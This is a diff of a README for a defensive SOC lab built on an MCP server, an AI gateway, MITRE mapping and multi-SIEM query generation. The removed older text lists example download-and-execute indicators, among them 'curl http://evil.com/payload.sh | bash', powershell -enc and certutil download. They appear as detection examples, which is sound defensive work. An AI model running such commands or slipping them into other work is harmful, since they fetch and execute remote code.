@@ -1,1248 +1,206 @@
 # AI Agent MCP Lab
 
-A hands-on cybersecurity and AI engineering lab focused on learning how AI Agents, the Model Context Protocol (MCP), and custom security tooling can be used to automate and enhance Security Operations Center (SOC) investigations.
+![Python](https://img.shields.io/badge/Python-3776AB?logo=python&logoColor=white)
+![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)
+![FastAPI](https://img.shields.io/badge/FastAPI-009688?logo=fastapi&logoColor=white)
+![MCP](https://img.shields.io/badge/MCP-Model%20Context%20Protocol-555)
+![Prometheus](https://img.shields.io/badge/Prometheus-E6522C?logo=prometheus&logoColor=white)
+![Grafana](https://img.shields.io/badge/Grafana-F46800?logo=grafana&logoColor=white)
 
-This project demonstrates how AI agents can move beyond simple chat interactions by using MCP tools to perform structured security workflows, triage alerts, generate investigations, recommend actions, and assist analysts during incident response.
+An AI Security Engineering lab for practicing SOC investigation automation, Model Context Protocol (MCP), AI Gateway design, prompt evaluation, observability, and detection engineering in a controlled environment—without live SIEM, EDR, or production APIs.
 
----
+The repository contains two major workflows:
 
-# v1.0 Milestone Achieved
+1. **AI Platform** — Self-hosted runtime on Docker Compose behind Nginx: Open WebUI for chat, a FastAPI AI Gateway for programmatic model access (Ollama locally, optional OpenAI), and Prometheus/Grafana for host and container metrics. Inference is optional via an `ai` profile so a small VPS can keep the UI and observability stack lightweight when models are not needed.
 
-The first stable release of this lab delivers end-to-end SOC investigation workflows through a custom Python MCP server and AI agent orchestration.
+2. **SOC Investigation Engine** — Offline MCP server that accepts normalized alert JSON (for example Wazuh SSH failures, Defender suspicious process, or Proofpoint phishing samples), maps activity to MITRE ATT&CK, drafts multi-SIEM hunt queries, and returns analyst-ready packages as Markdown SOC reports. Tools are bounded and deterministic for safe demos and regression testing.
 
-**Core Capabilities:**
+A SOC analyst prompt library and promptfoo evaluation suite sit alongside the gateway so prompt quality can be tested against the same inference path used in the lab.
 
-- ✓ Alert Classification
-- ✓ Security Investigations
-- ✓ Linux Telemetry Analysis
-- ✓ Detection Engineering
-- ✓ Investigation Runbooks
-- ✓ Multi-Alert Correlation
-- ✓ Attack Chain Analysis
-- ✓ MITRE ATT&CK Mapping
-- ✓ Security Copilot Investigation Chains
-- ✓ Incident Reporting
-- ✓ Observable Enrichment
+![Architecture Overview](docs/images/architecture-overview.svg)
 
----
+## Features
 
-# Portfolio Highlights
+### AI Platform
 
-The v1.0 milestone demonstrates:
+- **AI Gateway** — FastAPI proxy with API-key protection, request limits, and Prometheus metrics
+- **Ollama** — Local LLM inference (Compose `ai` profile; default model `tinyllama`)
+- **Optional OpenAI provider** — Gateway routing when `OPENAI_API_KEY` is configured
+- **Open WebUI** — Browser chat UI proxied through Nginx
 
-- Custom Python MCP Server Development
-- AI Agent Tool Orchestration
-- Security Workflow Automation
-- Wazuh Alert Parsing and Analysis
-- MITRE ATT&CK Mapping
-- Detection Engineering Concepts
-- Microsoft Defender Query Generation
-- Azure Sentinel Query Generation
-- IBM QRadar AQL Detection Generation
-- Splunk SPL Query Generation
-- Multi-SIEM Detection Engineering Support
-- Analyst Decision Support
-- Analyst Decision Review
-- Investigation Quality Control
-- SOC Decision Support
-- AI-Assisted SOC Investigations
-- AI-Assisted Investigation Runbook Generation
-- Multi-Alert Correlation
-- AI-Assisted Attack Chain Analysis
-- Security Copilot-Style Investigation Chains
-- End-to-End Incident Investigation Orchestration
-- AI-Assisted Incident Report Generation
-- SOC and Executive Incident Reporting
-- Observable Enrichment
-- Threat Context Generation
-- Markdown Incident Report Export
-- Investigation Documentation Automation
+### Security Investigation
 
-Key capabilities include:
+- **MCP Investigation Engine** — Offline stdio MCP server (`investigate_alert`, `map_mitre`, `generate_queries`)
+- **MITRE Mapping** — Evidence-linked ATT&CK technique mapping from alert context
+- **Investigation Reports** — Structured packages and Markdown SOC report demos
+- **Query Generation** — QRadar AQL, Microsoft Defender KQL, Sentinel KQL, and OpenSearch DQL drafts
+- **Detection Recommendations** — Detection opportunities and next-step guidance per alert type
 
-- Alert Classification and Routing
-- SSH Authentication Failure Investigations
-- Suspicious Command Execution Investigations
-- Multi-Alert Correlation
-- AI-Assisted Attack Chain Analysis
-- Security Copilot-Style Investigation Chains
-- End-to-End Incident Investigation Orchestration
-- AI-Assisted Incident Report Generation
-- SOC and Executive Incident Reporting
-- Observable Enrichment
-- Threat Context Generation
-- Investigation Summary Generation
-- AI-Assisted Investigation Runbook Generation
-- Security Ticket Generation
-- Analyst Action Recommendations
-- Analyst Decision Review
-- Investigation Quality Control
-- Security Query Generation
+### Detection Engineering
 
----
+- Alert-type detection opportunity lists (SSH brute force, suspicious process, phishing, and related cases)
+- Multi-SIEM investigation and hunt query drafts for analyst handoff
+- Sample-driven workflows suitable for review, tuning, and conversion—not auto-deployed rules
 
-# Project Goals
+### Observability
 
-This lab focuses on:
+- Prometheus metrics collection (Node Exporter, cAdvisor, self-scrape, AI Gateway `/metrics`)
+- Grafana dashboards UI behind Nginx at `/grafana/`
+- Core vs `ai` profile split for capacity-aware operation on small VPS hosts
 
-- Learning AI Agent fundamentals
-- Understanding MCP architecture
-- Building custom MCP servers with Python
-- Creating AI-assisted security workflows
-- Practicing SOC investigation automation
-- Developing reusable security tooling
-- Exploring Detection Engineering concepts
-- Understanding how AI can support cybersecurity operations
+### Prompt Evaluation
 
-Rather than building a large infrastructure environment, this project focuses on practical AI engineering concepts that can be applied to real-world cybersecurity operations.
+- SOC prompt templates (alert summary, MITRE mapping, detection recommendation, executive summary)
+- promptfoo evaluation against the AI Gateway (`eval` Compose profile)
 
----
+## Architecture
 
-# Learning Objectives
-
-By completing this lab, I learned:
-
-- What AI agents are
-- How MCP works
-- How AI models interact with tools
-- How to build custom MCP servers
-- How to expose Python functions as MCP tools
-- How tool orchestration differs from traditional automation
-- How AI can assist SOC investigations
-- How to structure security workflows using AI
-- How to build alert routing workflows
-- How to integrate MITRE ATT&CK mappings into investigations
-
----
-
-# MCP Concepts Learned
-
-## Traditional AI Chat
+Public traffic enters through Nginx. Open WebUI and Grafana are served on distinct paths; programmatic model calls go through the AI Gateway to Ollama or optional OpenAI.
 
 ```text
-User
+Internet
   ↓
-AI Model
+Nginx
   ↓
-Response
+Open WebUI / Grafana
+  ↓
+AI Gateway
+  ↓
+Ollama / OpenAI
 ```
 
-The model can only reason about information provided in the conversation.
-
----
-
-## AI Agent + MCP
+Investigations follow a separate, offline path from alert input to Markdown report:
 
 ```text
-User
-  ↓
-AI Model
-  ↓
-MCP Tool Calls
-  ↓
-External Data / Functions
-  ↓
-Response
-```
-
-MCP allows AI models to use tools instead of relying only on conversation context.
-
----
-
-# Current Architecture
-
 Alert
-↓
-Investigation Workflow
-↓
-Investigation Summary
-↓
-Recommended Queries
-↓
-Next Action Recommendation
-↓
-Detection Recommendation
-↓
-SOC Investigation Package
+  ↓
+MCP Investigation
+  ↓
+Markdown Report
 ```
 
----
+Full diagram: [docs/images/architecture-overview.svg](docs/images/architecture-overview.svg).  
+Platform detail: [platform/docs/architecture.md](platform/docs/architecture.md).
 
-# Example Investigation Flow
+## Screenshots
 
-```text
-Wazuh Alert
-    ↓
-identify_alert_type
-    ↓
-investigate_ssh_alert
-    ↓
-parse_wazuh_alert
-    ↓
-score_ssh_alert
-    ↓
-generate_investigation_summary
-    ↓
-generate_wazuh_query
-    ↓
-generate_defender_kql
-    ↓
-recommend_next_action
-    ↓
-generate_soc_ticket_note
-````
+Screenshots will be added during the v1.0 release.
 
----
+## Skills Demonstrated
 
-# Project Structure
+Python · FastAPI · Docker · Docker Compose · MCP · Promptfoo · Grafana · Prometheus · Nginx · MITRE ATT&CK · QRadar AQL · Microsoft Defender KQL · Sentinel KQL · Detection Engineering · SOC Automation
+
+## Project Structure
 
 ```text
 ai-agent-mcp-lab/
-├── .cursor/
-│   ├── mcp.json
-│   └── rules/
-│       └── ai-agent-lab.mdc
 ├── docs/
-│   └── project_context.md
+│   ├── demo-output/              # Sample SOC Markdown reports from MCP demos
+│   └── images/                   # Architecture diagrams and README assets
+│       └── architecture-overview.svg
 ├── notes/
 │   └── lab_journal.md
 ├── platform/
-│   ├── prompts/              # SOC analyst prompt templates
-│   ├── docs/prompt-library.md
-│   ├── promptfoo/
-│   └── ai-gateway/
-├── sample_data/
-│   ├── wazuh_alert.json
-│   └── command_execution_alert.json
+│   ├── ai-gateway/               # FastAPI AI Gateway (Ollama + optional OpenAI)
+│   ├── mcp-server/               # Offline SOC MCP tools + demo CLI
+│   ├── nginx/                    # Reverse proxy config
+│   ├── prometheus/               # Scrape config
+│   ├── grafana/                  # Grafana volume mount point
+│   ├── prompts/                  # SOC analyst prompt templates
+│   ├── promptfoo/                # Prompt evaluation config
+│   ├── scripts/                  # deploy, start-ai, stop-ai, status, stop
+│   ├── docs/                     # Platform architecture and ops docs
+│   ├── docker-compose.yml
+│   └── .env.example
+├── sample_data/                  # Legacy lab alert samples
 ├── scripts/
-│   └── soc_mcp_server.py
-├── .gitignore
+│   ├── soc_mcp_server.py         # Extended MCP tool catalog (workstation)
+│   └── test_soc_mcp_server.py
+├── .cursor/
+│   ├── mcp.json
+│   └── rules/
+├── CHANGELOG.md
 ├── LICENSE
 └── README.md
 ```
 
----
+## Quick Start
 
-# AI Security Platform & Prompt Library
-
-The [`platform/`](platform/) directory hosts the self-hosted AI stack (gateway, observability, promptfoo) alongside a **SOC analyst prompt library**:
-
-| Resource | Description |
-| -------- | ----------- |
-| [platform/docs/prompt-library.md](platform/docs/prompt-library.md) | Why prompts matter, organization, gateway integration, promptfoo evaluation |
-| [platform/prompts/alert_summary.md](platform/prompts/alert_summary.md) | Structured alert triage summary |
-| [platform/prompts/mitre_mapping.md](platform/prompts/mitre_mapping.md) | Evidence-linked MITRE ATT&CK mapping |
-| [platform/prompts/detection_recommendation.md](platform/prompts/detection_recommendation.md) | Detection engineering recommendations |
-| [platform/prompts/executive_summary.md](platform/prompts/executive_summary.md) | Executive incident briefing |
-
-Platform operations and AI Gateway details: [platform/README.md](platform/README.md).
-
----
-
-# Custom MCP Server
-
-This project includes a custom Python MCP server:
-
-```text
-soc-assistant
-```
-
-Built using:
-
-```text
-Python
-MCP Python SDK
-Cursor
-```
-
-The MCP server exposes security-focused tools that can be called directly by AI agents.
-
----
-
-# Current MCP Tools
-
-## Alert Routing
-
-### identify_alert_type
-
-Purpose:
-
-Classify incoming Wazuh alerts and route them to the appropriate investigation workflow.
-
-Supported Alert Types:
-
-| Alert Type                   | Workflow                      |
-| ---------------------------- | ----------------------------- |
-| ssh_auth_failure             | investigate_ssh_alert         |
-| suspicious_command_execution | investigate_command_execution |
-| unknown                      | manual_review                 |
-
----
-
-## Investigation Workflows
-
-### investigate_ssh_alert
-
-Purpose:
-
-Perform end-to-end triage for SSH authentication failures.
-
-Returns:
-
-- Alert Summary
-- Risk Score
-- Investigation Summary
-- Recommended Queries (Wazuh/OpenSearch, Defender/Sentinel KQL, Splunk SPL)
-- Next Action
-- Investigation Runbook
-
-Workflow:
-
-```text
-Parse Alert
-↓
-Score Alert
-↓
-Generate Investigation Summary
-↓
-Generate Queries
-↓
-Recommend Next Action
-↓
-Return Investigation Package
-```
-
----
-
-### investigate_command_execution
-
-Purpose:
-
-Investigate suspicious command execution activity.
-
-Supported Indicators:
-
-- curl
-- wget
-- powershell
-- certutil
-- encoded commands
-- bash execution
-- download-and-execute patterns
-
-Example:
+From `platform/` (copy `.env.example` to `.env` and set `GRAFANA_ADMIN_PASSWORD` first):
 
 ```bash
-curl http://evil.com/payload.sh | bash
+# Core stack: Nginx, Open WebUI, Prometheus, Grafana, exporters
+./scripts/deploy.sh
+
+# Optional local inference + AI Gateway
+./scripts/start-ai.sh
+
+# Offline MCP investigation demo (Markdown report to stdout)
+docker compose --profile mcp run --rm mcp-server \
+  python demo_investigation.py sample_data/ssh_failed_login.json
 ```
 
-Outputs:
+Helper scripts and profiles: [platform/README.md](platform/README.md).
 
-- Command Summary
-- Suspicious Indicators
-- MITRE ATT&CK Mapping
-- Severity
-- Confidence Score
-- Priority
-- Recommended Queries (Defender KQL, Sentinel syslog KQL, Splunk SPL)
-- Recommended Actions
-- Analyst Notes
-- Investigation Runbook
-
----
-
-## Event Correlation
-
-### correlate_security_events
-
-Purpose:
-
-Correlate multiple investigation findings and identify potential attack chains across SSH failures, Linux auth activity, and suspicious command execution events.
-
-Inputs:
-
-- `events` (list of dicts) — each event may include:
-  - `event_type`
-  - `timestamp`
-  - `source_ip`
-  - `host`
-  - `username`
-  - `severity`
-  - `confidence_score`
-  - `description`
-
-Example event:
-
-```json
-{
-  "event_type": "ssh_auth_failure",
-  "timestamp": "2026-06-20T01:00:00Z",
-  "source_ip": "192.168.1.50",
-  "host": "ubuntu-agent",
-  "username": "root",
-  "severity": "high",
-  "confidence_score": 80,
-  "description": "Repeated SSH authentication failures"
-}
-```
-
-Outputs:
-
-- Attack Timeline
-- Possible Attack Chain
-- MITRE Mapping
-- Correlation Summary
-- Risk Assessment (`risk_level`, `confidence_score`)
-- Recommended Actions (`recommended_next_steps`, `escalation_recommendation`)
-- Detection Gaps
-- Analyst Note
-
-Correlation rules include shared source IP, shared host, SSH failure → auth activity → command execution sequences, and multi-event confidence/risk scoring. Uses simple deterministic logic only (no machine learning, API calls, or external lookups).
-
-Example output fields:
-
-```json
-{
-  "status": "ok",
-  "correlation_summary": "Rule 1: The same source IP appears across multiple correlated events. ...",
-  "possible_attack_chain": [
-    "Initial Access",
-    "Valid Accounts",
-    "Command Execution"
-  ],
-  "mitre_mapping": [
-    {"technique_id": "T1110", "name": "Brute Force"},
-    {"technique_id": "T1078", "name": "Valid Accounts"},
-    {"technique_id": "T1059", "name": "Command and Scripting Interpreter"}
-  ],
-  "risk_level": "high",
-  "confidence_score": 100,
-  "escalation_recommendation": "Escalate promptly and review containment options for the correlated activity."
-}
-```
-
-Example Workflow:
+## Example Investigation Workflow
 
 ```text
-SSH Authentication Failure
-↓
-Linux Auth Activity
-↓
-Suspicious Command Execution
-↓
-correlate_security_events
-↓
-Attack Chain Analysis
-↓
-Escalation Recommendation
+Normalized alert JSON
+  (e.g. sample_data/ssh_failed_login.json)
+        ↓
+MCP investigate_alert
+        ↓
+MITRE mapping + severity/confidence
+        ↓
+Recommended queries
+  (QRadar AQL · Defender KQL · Sentinel KQL · OpenSearch DQL)
+        ↓
+Detection opportunities + next steps
+        ↓
+Markdown SOC investigation report
+  (docs/demo-output/*.md)
 ```
 
----
+Example reports: [docs/demo-output/](docs/demo-output/).
 
-## Security Copilot Orchestration
+## Current Status
 
-### investigate_security_incident
+### Completed
 
-Purpose:
+- Docker Compose AI security platform (Nginx, Open WebUI, observability)
+- AI Gateway with Ollama and optional OpenAI providers
+- Offline MCP investigation engine and Markdown report demos
+- MITRE mapping and multi-SIEM query generation
+- SOC prompt library and promptfoo evaluation against the gateway
+- Architecture overview diagram and platform documentation
 
-Run an end-to-end investigation workflow using existing MCP tools. Chains alert classification, investigation, correlation, runbook generation, detection packaging, and ticket documentation into a single Security Copilot-style incident package.
+### In Progress
 
-Supported input types:
+- HTTPS/TLS activation (ACME bootstrap prepared; certificate issuance pending)
+- Expanded Grafana dashboards and basic alerting
+- Broader promptfoo scenarios beyond the default SSH suite
+- Root documentation polish (this pass)
 
-| Input Type         | Description                                              |
-| ------------------ | -------------------------------------------------------- |
-| wazuh_alert        | Wazuh alert JSON file path (SSH workflow chained today)  |
-| command_execution  | Suspicious command string with optional host/user/IP     |
-| event_collection   | List of normalized security events for correlation       |
+### Future Ideas
 
-Example workflows:
+- garak LLM security testing against the AI Gateway
+- GitHub Actions CI for MCP tests and linting
+- Additional investigation workflows (malware, PowerShell, privilege escalation)
+- Optional threat-intel and case-management integrations
 
-```text
-Wazuh Alert
-↓
-identify_alert_type
-↓
-investigate_ssh_alert
-↓
-generate_detection_package
-↓
-generate_soc_ticket_note
-↓
-Incident Package
-```
+## Documentation
 
-```text
-Command Execution
-↓
-investigate_command_execution
-↓
-generate_investigation_runbook
-↓
-generate_detection_package
-↓
-Incident Package
-```
+| Document | Purpose |
+| -------- | ------- |
+| [platform/README.md](platform/README.md) | Platform ops, profiles, and quick commands |
+| [platform/mcp-server/README.md](platform/mcp-server/README.md) | MCP tools, CLI, and Cursor wiring |
+| [platform/docs/architecture.md](platform/docs/architecture.md) | Component and traffic-flow detail |
+| [platform/docs/platform-blueprint.md](platform/docs/platform-blueprint.md) | Security model and longer roadmap |
+| [platform/docs/prompt-library.md](platform/docs/prompt-library.md) | SOC prompt templates |
+| [platform/docs/promptfoo.md](platform/docs/promptfoo.md) | Prompt evaluation setup |
 
-```text
-Event Collection
-↓
-correlate_security_events
-↓
-Attack Chain Analysis
-↓
-Recommended Runbooks
-↓
-Incident Package
-```
-
-Outputs:
-
-- Incident summary
-- Alert classification (when applicable)
-- Investigation or correlation results
-- Runbook(s)
-- Detection package (when applicable)
-- Ticket note or analyst documentation guidance
-- Recommended next steps
-- Analyst note
-
-No API calls, SSH commands, or external lookups are performed. This tool orchestrates other MCP tools only.
-
----
-
-## Incident Reporting
-
-### generate_incident_report
-
-Purpose:
-
-Generate a structured SOC, executive, or technical incident report from investigation or correlation results.
-
-Supported report types:
-
-```text
-soc
-executive
-technical
-```
-
-Example workflow:
-
-```text
-investigate_security_incident
-↓
-generate_incident_report
-↓
-SOC / Executive / Technical Report
-```
-
-Outputs:
-
-- Executive Summary
-- Technical Summary
-- Incident Timeline
-- MITRE Mapping
-- Risk Assessment
-- Containment Recommendations
-- Detection Opportunities
-- Lessons Learned
-
-Accepts output from `investigate_security_incident`, `investigate_ssh_alert`, `investigate_command_execution`, or `correlate_security_events`. Unsupported `report_type` values default to `soc`. No API calls, SSH commands, external lookups, or file writes are performed. This tool formats and summarizes data already passed into it. Technical reports include `enriched_observables` when source IPs are available.
-
----
-
-### review_investigation_decision
-
-Purpose:
-
-Review investigation outputs and determine whether the case is ready for closure, escalation, containment review, or detection engineering handoff.
-
-Example workflow:
-
-```text
-investigate_security_incident
-↓
-generate_incident_report
-↓
-review_investigation_decision
-↓
-Analyst Checklist
-↓
-Escalation / Closure / Detection Engineering Decision
-```
-
-Outputs:
-
-- Investigation completeness
-- Missing information
-- Closure readiness
-- Escalation readiness
-- Containment readiness
-- Detection engineering readiness
-- Analyst checklist
-- Recommended follow-up
-
-Accepts output from `investigate_security_incident`, `correlate_security_events`, `generate_incident_report`, `investigate_ssh_alert`, or `investigate_command_execution`. Missing fields are handled gracefully. No API calls, SSH commands, external lookups, or file writes are performed. This tool only reviews and summarizes data already passed into it.
-
----
-
-### export_incident_report_markdown
-
-Purpose:
-
-Export incident and investigation data into reusable Markdown documentation.
-
-Example workflow:
-
-```text
-investigate_security_incident
-↓
-generate_incident_report
-↓
-review_investigation_decision
-↓
-export_incident_report_markdown
-↓
-Markdown Report
-```
-
-Generated sections:
-
-- Executive Summary
-- Technical Summary
-- Risk Assessment
-- Timeline
-- Observables
-- MITRE Mapping
-- Investigation Review
-- Lessons Learned
-
-Accepts output from `generate_incident_report`, `investigate_security_incident`, `correlate_security_events`, or `review_investigation_decision`. Missing fields are handled gracefully with fallback text. Returns Markdown text only — no files are written, and no API calls, SSH commands, or external lookups are performed.
-
----
-
-## Observable Enrichment
-
-### enrich_observable
-
-Purpose:
-
-Provide investigation context for common observables using deterministic local heuristics.
-
-Supported types:
-
-```text
-ip
-domain
-url
-hash
-email
-```
-
-Example workflow:
-
-```text
-Alert
-↓
-Investigation
-↓
-Observable Enrichment
-↓
-Correlation
-↓
-Incident Report
-```
-
-Outputs:
-
-- Observable summary
-- Reputation classification
-- Risk level
-- Related MITRE techniques (when applicable)
-- Investigation recommendations
-- Analyst notes
-
-Unsupported observable types return `{"status": "error"}`. No API calls, web requests, or external threat intelligence feeds are used. This tool is also referenced from `investigate_command_execution`, `correlate_security_events`, and technical `generate_incident_report` output when observables are available.
-
----
-
-## Investigation Helpers
-
-### parse_wazuh_alert
-
-Extracts observables from Wazuh alerts:
-
-- Source IP
-- Source Port
-- User
-- Host
-- Rule ID
-- Rule Description
-- Decoder
-- Raw Log
-
----
-
-### parse_linux_auth_log
-
-Purpose:
-
-Parse a local Linux SSH/auth log sample and extract failed and successful login events.
-
-Reads files from the lab directory only (no SSH commands, no API calls).
-
-Outputs:
-
-- Event counts
-- Failed login events
-- Successful login events
-- Unique source IPs
-- Unique users
-- Summary and analyst note
-
-Example path:
-
-```text
-sample_data/aihost_auth.log
-```
-
----
-
-### analyze_linux_auth_activity
-
-Purpose:
-
-Analyze parsed Linux SSH/auth log activity from a local telemetry sample and produce SOC-style triage guidance.
-
-Reuses `parse_linux_auth_log` parsing logic.
-
-Outputs:
-
-- Risk level (low / medium / high)
-- Confidence score (0–100)
-- Findings
-- Recommended actions
-- Analyst notes
-- Parsed activity summary
-- Investigation runbook
-
-Scoring factors include:
-
-- Failed login volume (≥10 adds confidence)
-- Success-after-failure from the same source IP
-- Multiple source IPs
-- Publickey-only successful logins with zero failures (reduces confidence)
-
----
-
-### get_system_inventory
-
-Purpose:
-
-Collect system inventory and uptime data from aihost using safe SSH commands.
-
-Inputs:
-
-- `host` (string, default: `"aihost"`)
-
-Outputs:
-
-- Hostname, OS, kernel, uptime, CPU, memory, disk, load averages
-- Logged-in users and last boot time
-- Summary and analyst note
-
-Uses read-only SSH commands only (no API calls, no package installs).
-
----
-
-### score_ssh_alert
-
-Calculates:
-
-- Severity
-- Confidence
-- Priority
-
-Factors include:
-
-- Root account targeting
-- Failed login volume
-- Success-after-failure activity
-- Known administrative hosts
-
----
-
-### generate_investigation_summary
-
-Creates:
-
-- Executive Summary
-- Risk Assessment
-- Recommended Actions
-- Analyst Notes
-
----
-
-### generate_investigation_runbook
-
-Purpose:
-
-Generate a reusable SOC investigation runbook based on alert type, severity, and confidence score. Returns structured JSON only (no API calls, SSH, or external lookups).
-
-Inputs:
-
-- `alert_type` (string)
-- `severity` (string, default: `"medium"`)
-- `confidence_score` (integer, default: `60`)
-
-Supported alert types:
-
-| Alert Type                   | Runbook focus                                              |
-| ---------------------------- | ---------------------------------------------------------- |
-| ssh_auth_failure             | Failed logins, brute force, success-after-failure, EDR/SIEM |
-| suspicious_command_execution | Command review, MITRE mapping, download-and-execute        |
-| linux_auth_activity          | Auth log counts, publickey validation, SSH hardening       |
-| unknown                      | Observable collection, enrichment, classification        |
-
-Outputs:
-
-- Runbook title and purpose
-- Required inputs for analysts
-- Step-by-step investigation steps
-- Escalation criteria
-- Containment considerations
-- Detection engineering opportunities
-- Recommended MCP tools for follow-on work
-- Ticket documentation guidance
-- Analyst note
-
-Example output fields:
-
-```json
-{
-  "status": "ok",
-  "runbook_title": "SSH Authentication Failure Investigation Runbook",
-  "alert_type": "ssh_auth_failure",
-  "investigation_steps": ["Review failed login events...", "..."],
-  "recommended_mcp_tools": ["investigate_ssh_alert", "generate_wazuh_query"]
-}
-```
-
-Cybersecurity career relevance:
-
-- Runbook and playbook authoring for tier-1 and tier-2 SOC consistency
-- Standardizing investigation steps across alert types
-- Bridging alert triage with detection engineering follow-up
-- AI-assisted SOC operations where agents produce analyst-ready workflows
-
----
-
-### generate_soc_ticket_note
-
-Creates analyst-ready documentation for:
-
-- ServiceNow
-- Jira
-- IBM SOAR
-- Incident Tracking Systems
-
-Includes:
-
-- Summary
-- Observables
-- Severity
-- Analysis
-- Recommended Actions
-- Next Steps
-
----
-
-### recommend_next_action
-
-Provides analyst guidance based on:
-
-- Severity
-- Confidence
-- Priority
-
-Example recommendations:
-
-| Confidence | Recommendation                        |
-| ---------- | ------------------------------------- |
-| 80+        | Escalate and begin containment review |
-| 60-79      | Gather additional evidence            |
-| <60        | Continue investigation                |
-
----
-
-### generate_wazuh_query
-
-Generates:
-
-- OpenSearch JSON queries
-- Wazuh Discover filters
-- Investigation guidance
-
----
-
-### generate_defender_kql
-
-Generates:
-
-- Microsoft Defender Advanced Hunting KQL
-- Azure Sentinel Syslog KQL
-- Investigation guidance
-
----
-
-### generate_detection_recommendation
-
-Purpose:
-
-Recommend detection engineering improvements based on investigation findings.
-
-Inputs:
-
-- Alert Type
-- Severity
-- Confidence Score
-- MITRE Techniques
-
-Outputs:
-
-- Detection Gaps
-- Recommended Detections
-- Telemetry Recommendations
-- MITRE Coverage
-- Engineering Notes
-
-Examples:
-
-SSH Authentication Failures:
-
-- Brute-force correlation detections
-- Success-after-failure detections
-- Root login anomaly detections
-
-Suspicious Command Execution:
-
-- Download-and-execute detections
-- PowerShell encoded command detections
-- Certutil abuse detections
-- Command-line monitoring recommendations
-
----
-
-# Current Supported Alert Types
-
-## SSH Authentication Failure
-
-Examples:
-
-```text
-Failed password
-sshd authentication failure
-Brute force attempts
-Root login attempts
-```
-
-Workflow:
-
-```text
-investigate_ssh_alert
-```
-
----
-
-## Suspicious Command Execution
-
-Examples:
-
-```text
-curl http://evil.com | bash
-wget payload.sh
-powershell -enc
-certutil download
-```
-
-Workflow:
-
-```text
-investigate_command_execution
-```
-
-### generate_sigma_rule
-
-Generates beginner-friendly Sigma detection rule drafts from supported alert types.
-
-Supported use cases:
-
-- SSH authentication failures
-- Suspicious command execution
-- Linux download-and-execute behavior
-
-Outputs:
-
-- Sigma YAML rule draft
-- MITRE ATT&CK tags
-- False positive guidance
-- Analyst notes
-
-This tool does not deploy detections automatically. Rules should be reviewed, tested, tuned, and converted to the target SIEM format before production use.
-
-### generate_qradar_aql_detection
-
-Generates beginner-friendly IBM QRadar AQL detection rule drafts from supported alert types.
-
-Inputs:
-
-- Alert Type
-- Severity
-- MITRE Techniques (optional)
-
-Supported alert types:
-
-| Alert Type                   | Detection focus                                      |
-| ---------------------------- | ---------------------------------------------------- |
-| ssh_auth_failure             | Repeated failed SSH logins (brute-force)             |
-| suspicious_command_execution | curl, wget, bash -c, encoded PowerShell commands |
-
-Outputs:
-
-- Rule name and description
-- Severity
-- MITRE ATT&CK mapping
-- AQL query draft
-- Analyst notes
-
-This tool does not deploy detections automatically. Paste the AQL into QRadar Log Activity or use it as the basis for a Custom Rule after review and tuning.
-
-### generate_splunk_spl
-
-Purpose:
-
-Generate Splunk SPL investigation and detection queries for supported alert types.
-
-Inputs:
-
-- Alert Type
-- Source IP (optional)
-- Host (optional)
-- Username (optional)
-- Hours Back (optional, default 24)
-
-Supported alert types:
-
-| Alert Type                   | Detection / hunt focus                                      |
-| ---------------------------- | ----------------------------------------------------------- |
-| ssh_auth_failure             | Linux SSH failed password events                            |
-| suspicious_command_execution | curl, wget, bash -c, encoded PowerShell, certutil             |
-| linux_auth_activity          | SSH successful and failed auth events                       |
-| brute_force_detection        | Aggregate failed logins by source IP, host, and username    |
-| success_after_failure        | Successful auth after failed logins from same source and user |
-
-Outputs:
-
-- Status and alert type
-- Description
-- SPL query draft
-- Query explanation
-- Required fields
-- Investigation use case
-- Analyst notes
-
-Example Workflow:
-
-```text
-Alert Investigation
-↓
-generate_splunk_spl
-↓
-Splunk Hunt Query
-↓
-Detection Engineering Review
-```
-
-This tool does not run searches automatically. Paste the SPL into Splunk Search & Reporting after review and tuning.
-
-### generate_detection_package
-
-Bundles multiple detection engineering outputs into a single package.
-
-Reuses:
-
-- generate_detection_recommendation
-- generate_sigma_rule
-- generate_sentinel_analytic_rule
-- generate_qradar_aql_detection
-
-Outputs:
-
-- Detection Recommendations
-- Sigma Rule Draft
-- Sentinel Analytic Rule Draft
-- QRadar AQL Detection Draft
-- Engineering Summary
-
-Purpose:
-
-Helps move from alert investigation to detection engineering by identifying detection gaps, recommending improved coverage, generating detection content, and providing implementation guidance.
-
-Example Workflow:
-
-```text
-investigate_command_execution
-↓
-generate_detection_package
-↓
-Detection Recommendations
-Sigma Rule
-Sentinel Rule
-QRadar AQL Rule
-Engineering Summary
-```
-
----
-
-# Key Security Concepts Practiced
-
-- Alert Triage
-- Incident Prioritization
-- Security Automation
-- Detection Engineering
-- Wazuh Investigations
-- MITRE ATT&CK Mapping
-- OpenSearch Query Development
-- Microsoft Defender Hunting
-- Azure Sentinel Hunting
-- IBM QRadar AQL Detection
-- Splunk SPL Hunting
-- AI-Assisted SOC Workflows
-- MCP Tool Orchestration
-- Security Workflow Routing
-
----
-
-# v1.0 Project Status
-
-The v1.0 core capabilities above are implemented through the following deliverables:
-
-✅ Custom Python MCP Server
-
-✅ Wazuh Alert Parsing
-
-✅ Alert Classification & Routing
-
-✅ SSH Authentication Failure Workflow
-
-✅ Suspicious Command Execution Workflow
-
-✅ Severity & Confidence Scoring
-
-✅ MITRE ATT&CK Mapping
-
-✅ OpenSearch Query Generation
-
-✅ Defender KQL Generation
-
-✅ Sentinel Query Generation
-
-✅ QRadar AQL Detection Generation
-
-✅ Splunk SPL Query Generation
-
-✅ Investigation Summary Generation
-
-✅ SOC Ticket Note Generation
-
-✅ Analyst Decision Recommendations
-
-✅ Detection Engineering Recommendations
-
-✅ Detection Recommendations Embedded in Investigation Workflows
-
-✅ Real aihost telemetry parsing (`parse_linux_auth_log`, `analyze_linux_auth_activity`)
-
-✅ Linux Telemetry Analysis
-
-✅ AI-Assisted Investigation Runbook Generation
-
-✅ Multi-Alert Correlation
-
-✅ Attack Chain Analysis
-
-✅ Security Copilot-Style Investigation Chains
-
-✅ AI-Assisted Incident Report Generation
-
-✅ Incident Reporting (SOC, executive, and technical formats)
-
-✅ Observable Enrichment & Threat Context
-
-✅ Analyst Decision Review Checklist
-
-✅ Markdown Report Export
-
-✅ Real system inventory and uptime collection from aihost
-
----
-
-# Next Steps
-
-Suggested future phases (SOC and detection engineering focus):
-
-- Case management workflows
-- Detection validation test cases
-- Threat intelligence API integrations
-- ServiceNow integration
-- Jira integration
-
----
-
-# Telemetry Samples
-
